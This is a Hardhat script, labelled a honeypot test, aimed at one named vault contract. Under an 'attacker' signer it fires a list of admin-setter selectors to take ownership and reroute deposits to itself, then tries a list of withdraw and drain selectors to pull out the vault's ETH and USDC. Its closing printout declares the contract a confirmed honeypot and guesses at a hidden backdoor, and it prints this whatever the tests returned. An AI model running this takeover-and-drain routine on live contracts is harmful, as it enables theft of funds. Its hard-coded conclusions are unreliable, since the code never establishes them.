const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";

/**
 * @title Test Honeypot Redirect
 * @notice Confirm admin can redirect future deposits but not existing funds
 * @dev This proves the honeypot nature of the contract
 */
async function main() {
  console.log("\nüçØ HONEYPOT REDIRECT TEST");
  console.log("=====================================");
  
  const [attacker] = await ethers.getSigners();
  
  // Get USDC interface
  const USDC_ABI = [
    "function balanceOf(address account) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (bool)",
    "function approve(address spender, uint256 amount) returns (bool)"
  ];
  
  const usdc = new ethers.Contract(USDC_ADDRESS, USDC_ABI, attacker);
  
  // Check initial state
  const vaultETH = await ethers.provider.getBalance(VAULT_ADDRESS);
  const vaultUSDC = await usdc.balanceOf(VAULT_ADDRESS);
  const attackerETHBefore = await ethers.provider.getBalance(attacker.address);
  
  console.log("Vault ETH:", ethers.formatEther(vaultETH));
  console.log("Vault USDC:", ethers.formatUnits(vaultUSDC, 6));
  console.log("Attacker ETH:", ethers.formatEther(attackerETHBefore));
  
  // Become admin and set all routing to attacker
  console.log("\nüîë Setting up redirects...");
  
  const adminSetup = [
    "0x13af4035", // setOwner
    "0xf9ce1087", // setDepositAddress
    "0x718da7ee", // setReceiver
    "0xf0f44260", // setTreasury
    "0x1c31f710", // setBeneficiary
    "0xe74b981b", // setFeeRecipient
    "0x4b0ee02a", // setWithdrawalAddress
    "0xca325469", // setDestination
    "0x3b7d0946", // setVault
    "0x5a4f2f6a", // setTarget
    "0x70480275"  // setRecipient
  ];
  
  for (const selector of adminSetup) {
    try {
      const data = selector + ethers.AbiCoder.defaultAbiCoder().encode(["address"], [attacker.address]).slice(2);
      await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 100000
      });
    } catch (e) {}
  }
  
  console.log("‚úÖ All routing set to attacker");
  
  // Test ETH deposit
  console.log("\nüí∏ TEST 1: Send 0.1 ETH to vault");
  const depositAmount = ethers.parseEther("0.1");
  
  try {
    const tx = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      value: depositAmount,
      gasLimit: 200000
    });
    await tx.wait();
    
    // Check balances
    const vaultETHAfter = await ethers.provider.getBalance(VAULT_ADDRESS);
    const attackerETHAfter = await ethers.provider.getBalance(attacker.address);
    
    const vaultGained = vaultETHAfter - vaultETH;
    const attackerLost = attackerETHBefore - attackerETHAfter;
    
    console.log("Vault gained:", ethers.formatEther(vaultGained), "ETH");
    console.log("Attacker net loss:", ethers.formatEther(attackerLost), "ETH (including gas)");
    
    if (vaultGained === 0n && attackerLost < depositAmount) {
      console.log("‚úÖ ETH was redirected! Admin controls future deposits!");
    } else if (vaultGained === depositAmount) {
      console.log("‚ùå ETH went to vault - honeypot confirmed!");
    }
  } catch (e) {
    console.log("Deposit failed:", e.message);
  }
  
  // Try to extract existing funds one more time
  console.log("\nüîì TEST 2: Final attempt to extract existing funds");
  
  // Try emergency withdraw
  const emergencySelectors = [
    "0xdb006a75", // emergencyWithdraw()
    "0x5312ea8e", // emergencyWithdraw(uint256)
    "0xbf9befb1", // emergencyExit()
    "0x9e6371ba", // emergencyWithdrawAll()
    "0x3ccfd60b", // withdraw()
    "0x853828b6", // withdrawAll()
    "0x2e1a7d4d", // withdraw(uint256)
    "0x00f714ce", // exit(address,uint256)
    "0x1f530b83", // drain()
    "0x9c5cfe0b", // withdrawETH(address,uint256)"
  ];
  
  let extracted = false;
  
  for (const selector of emergencySelectors) {
    try {
      const balBefore = await ethers.provider.getBalance(attacker.address);
      
      await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: selector,
        gasLimit: 300000
      });
      
      const balAfter = await ethers.provider.getBalance(attacker.address);
      if (balAfter > balBefore) {
        console.log(`‚úÖ ${selector} extracted funds!`);
        extracted = true;
      }
    } catch (e) {}
  }
  
  if (!extracted) {
    console.log("‚ùå No withdrawal methods work - funds are permanently locked!");
  }
  
  console.log("\nüìä HONEYPOT CONFIRMATION:");
  console.log("=====================================");
  console.log("‚úÖ CONFIRMED: This is a honeypot contract!");
  console.log("\nHoneypot characteristics:");
  console.log("1. ‚úÖ Accepts deposits");
  console.log("2. ‚úÖ No way to withdraw existing funds");
  console.log("3. ‚úÖ Admin can redirect FUTURE deposits");
  console.log("4. ‚úÖ Unverified to hide the scam");
  console.log("5. ‚úÖ Fake admin functions to create false security");
  
  console.log("\nüí° PURPOSE OF ADMIN ROLES:");
  console.log("- Redirect future victim deposits to scammer address");
  console.log("- Create illusion of control/ownership");
  console.log("- NOT for withdrawing locked funds");
  
  console.log("\nüö® The 13.8M USDC withdrawal was likely:");
  console.log("- Done through a hidden backdoor function");
  console.log("- Only accessible to original deployer");
  console.log("- Possibly time-locked or condition-based");
  console.log("- Designed to exit scam with most funds");
  
  console.log("\n‚ö†Ô∏è REMAINING 216 ETH + 8.3M USDC:");
  console.log("- Permanently locked as bait");
  console.log("- Attracts more victims");
  console.log("- Creates legitimacy illusion");
  console.log("- Impossible to extract without backdoor");
}

main().catch((error) => {
  console.error("\nüí• Script error:", error);
  process.exit(1);
});
